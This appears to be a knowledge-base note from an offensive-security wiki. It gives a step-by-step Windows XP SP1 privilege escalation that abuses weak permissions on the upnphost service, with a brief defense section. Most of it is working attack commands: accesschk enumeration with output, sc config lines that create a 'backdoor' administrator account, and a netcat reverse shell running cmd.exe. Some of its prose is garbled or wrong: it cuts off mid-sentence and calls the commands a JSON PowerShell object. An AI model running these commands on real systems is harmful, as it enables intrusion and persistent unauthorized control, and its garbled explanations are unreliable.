---
id: 4b0d8350-c1ba-4fb4-a288-d275355363f2
name: Windows XP SP1 - UPnP Host Exploit
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:29.561114+00:00'
updated_at: '2023-04-10T20:37:52.256842+00:00'
tactics:
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]'
- '[[Service Registry Permissions Weakness|T1058 - Service Registry Permissions Weakness]]'
tags:
- '[[EoP - Incorrect permissions in services]]'
- '[[Example with Windows XP SP1 - upnphost]]'
- '[[Windows - Privilege Escalation]]'
commands:
- '[[Accesschk.exe - Check Permissions for Authenticated Users and upnphost Services]]'
- '[[Accesschk.exe - Check Permissions for upnphost Service]]'
- '[[SC Config - Add Backdoor User and Password]]'
- '[[SC Config - Add Backdoor User to Administrators Group]]'
- '[[SC Config - Add netcat Backdoor Command]]'
- '[[SC Start - Start Vuln Service]]'
- '[[SC Start - Start Vuln Service]]'
- '[[SC Stop - Stop Vuln Service]]'
- '[[SC Stop - Stop Vuln Service]]'
---

# Windows XP SP1 - UPnP Host Exploit

## Summary

The Windows XP SP1 - UPnP Host Exploit is a technique used to escalate privileges on a Windows system. The exploit takes advantage of the incorrect permissions in the UPnP Host service, which allows an attacker to gain elevated privileges. The UPnP Host service is a Windows service that allows devi

## Description

# Description

The Windows XP SP1 - UPnP Host Exploit is a technique used to escalate privileges on a Windows system. The exploit takes advantage of the incorrect permissions in the UPnP Host service, which allows an attacker to gain elevated privileges. The UPnP Host service is a Windows service that allows devices to automatically discover and interact with each other on a network. By exploiting this service, an attacker can gain SYSTEM-level privileges on a Windows XP SP1 system.

To execute this exploit, the attacker needs to restart the SSDP and UPnP services, and then use the UPnP Host exploit to escalate privileges. This technique can be used by attackers to maintain persistence on a compromised system and gain access to sensitive information.

From a technical perspective, the exploit works by modifying the registry keys that control the permissions of the UPnP Host service. By changing the permissions to allow the attacker to modify the service, the attacker can then replace the service binary with a malicious one that runs with elevated privileges. This allows the attacker to execute arbitrary code with SYSTEM-level privileges.

The business value of this technique lies in its ability to give attackers access to sensitive information and control over a compromised system. By gaining SYSTEM-level privileges, attackers can install backdoors, exfiltrate data, and move laterally within a network.

 

## Requirements

1. Access to the target Windows XP SP1 system

1. Restart SSDP and UPnP services

1. Use of the UPnP Host exploit

 

## Defense

1. Regularly update Windows systems to ensure that known vulnerabilities are patched

1. Implement least privilege access control to limit the permissions of services and prevent unauthorized modifications to the registry

1. Use endpoint protection software to detect and prevent the execution of malicious code

 

## Objectives

1. Escalate privileges on a Windows XP SP1 system

1. Maintain persistence on a compromised system

1. Gain access to sensitive information

 

# Instructions

1. This command exploits a vulnerability in the UPnP Host service to execute a reverse shell on the target machine. The command sets the binary path of the service to the location of the nc.exe file on the attacker's machine, which is used to establish the reverse shell. It then sets the service to run under the LocalSystem account with an empty password, and starts the service. Once the service is started, the attacker can use the nc.exe tool to connect to the target machine and execute commands.

 



**Code**: [[# NOTE: spaces are mandatory for this exploit to w]]



> The 'sc config' command is used to configure the properties of a Windows service. The 'upnphost' service is used by Windows to host UPnP devices on the network. The 'binpath' parameter is used to specify the path to the executable file that the service should run. In this case, the path is set to the location of the nc.exe file on the attacker's machine, along with the IP address and port number to connect to. The 'obj' parameter is used to specify the account under which the service should run. In this case, it is set to run under the LocalSystem account. The 'password' parameter is used to specify the password for the account, but in this case it is left blank. The 'sc qc' command is used to display the configuration of the 'upnphost' service. The 'depend' parameter is used to specify any dependencies that the service has, but in this case it is left blank. Finally, the 'net start' command is used to start the 'upnphost' service.

2. This command will restart the SSDP and UPnP services on your system. It will configure the SSDPSRV service to start automatically and then start it. It will then stop the upnphost service and start it again with no dependencies. This can be useful in resolving issues related to network discovery and device connectivity.

 



**Code**: [[sc config SSDPSRV start=auto
net start SSDPSRV
net]]



> The 'sc config' command is used to configure the properties of a Windows service. In this case, we are setting the start type of the SSDPSRV service to 'auto'. The 'net start' and 'net stop' commands are used to start and stop services respectively. The 'sc config upnphost depend=""' command is used to remove any dependencies that the upnphost service may have, which can sometimes cause issues with the service starting properly.

3. To escalate privileges, follow these steps:
1. Use `accesschk.exe` to identify any services that are vulnerable to privilege escalation by running the command `accesschk.exe -uwcqv "Authenticated Users" * /accepteula`. This command will return a list of services that have write permissions for the Authenticated Users group.
2. Use `accesschk.exe` again to identify the permissions for the `upnphost` service by running the command `accesschk.exe -ucqv upnphost`. This command will return a list of users and groups that have access to the `upnphost` service.
3. Use the `sc` command to configure the vulnerable service to execute a command of your choice by running the command `sc config <vuln-service> binpath="<command>"`. Replace `<vuln-service>` with the name of the vulnerable service and `<command>` with the command you want to execute. For example, you can add a new user with administrative privileges by running the command `net user backdoor backdoor123 /add` or establish a reverse shell by running the command `C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe`.
4. Stop and start the vulnerable service by running the commands `sc stop <vuln-service>` and `sc start <vuln-service>`.
5. (Optional) Add a user to the `Administrators` group by running the command `sc config <vuln-service> binpath="net localgroup Administrators backdoor /add"`.
6. Stop and start the vulnerable service again to apply the changes.

 



**Code**: [[$ accesschk.exe -uwcqv "Authenticated Users" * /ac]]



> This JSON object contains a PowerShell command that can be used to escalate privileges on a Windows system by exploiting a vulnerable service configuration. The `accesschk.exe` command is used to identify vulnerable services and their permissions, and the `sc` command is used to configure the vulnerable service to execute a command of the attacker's choice. The `name` field of this JSON object describes the outcome of the commands, which is privilege escalation via service configuration. The `instruction` field provides step-by-step instructions on how to perform the attack, and the `explain` field provides additional context and explanation on the attack.



**Command** ([[Accesschk.exe - Check Permissions for Authenticated Users and upnphost Services]]):

```bash
$ accesschk.exe -uwcqv "Authenticated Users" * /accepteula
RW SSDPSRV
        SERVICE_ALL_ACCESS
RW upnphost
        SERVICE_ALL_ACCESS
```





**Command** ([[Accesschk.exe - Check Permissions for upnphost Service]]):

```bash
$ accesschk.exe -ucqv upnphost
upnphost
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
  RW BUILTIN\Power Users
        SERVICE_ALL_ACCESS
```





**Command** ([[SC Config - Add Backdoor User and Password]]):

```bash
$ sc config <vuln-service> binpath="net user backdoor backdoor123 /add"
```





**Command** ([[SC Config - Add netcat Backdoor Command]]):

```bash
$ sc config <vuln-service> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
```





**Command** ([[SC Stop - Stop Vuln Service]]):

```bash
$ sc stop <vuln-service>
```





**Command** ([[SC Start - Start Vuln Service]]):

```bash
$ sc start <vuln-service>
```





**Command** ([[SC Config - Add Backdoor User to Administrators Group]]):

```bash
$ sc config <vuln-service> binpath="net localgroup Administrators backdoor /add"
```





**Command** ([[SC Stop - Stop Vuln Service]]):

```bash
$ sc stop <vuln-service>
```





**Command** ([[SC Start - Start Vuln Service]]):

```bash
$ sc start <vuln-service>
```



## MITRE ATT&CK Mapping

### Tactics

- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]
- [[Service Registry Permissions Weakness|T1058 - Service Registry Permissions Weakness]]

## Commands Used

- [[Accesschk.exe - Check Permissions for Authenticated Users and upnphost Services]]
- [[Accesschk.exe - Check Permissions for upnphost Service]]
- [[SC Config - Add Backdoor User and Password]]
- [[SC Config - Add Backdoor User to Administrators Group]]
- [[SC Config - Add netcat Backdoor Command]]
- [[SC Start - Start Vuln Service]]
- [[SC Start - Start Vuln Service]]
- [[SC Stop - Stop Vuln Service]]
- [[SC Stop - Stop Vuln Service]]

## Tags

- [[EoP - Incorrect permissions in services]]
- [[Example with Windows XP SP1 - upnphost]]
- [[Windows - Privilege Escalation]]


